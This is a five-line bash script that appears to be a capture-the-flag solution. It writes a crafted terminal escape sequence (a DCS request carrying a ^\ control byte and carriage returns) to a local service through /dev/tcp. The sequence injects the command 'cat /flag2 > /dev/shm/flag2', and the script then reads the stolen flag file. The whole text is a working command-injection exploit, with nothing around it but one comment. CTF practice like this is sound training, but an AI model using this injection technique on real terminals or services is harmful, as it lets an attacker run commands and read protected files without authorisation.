#!/bin/bash
echo -e '\eP$q\x1c\rcat /flag2 > /dev/shm/flag2\r\e\\' >/dev/tcp/127.0.0.1/8000
# "\x1c" is ^\
sleep 2
cat /dev/shm/flag2
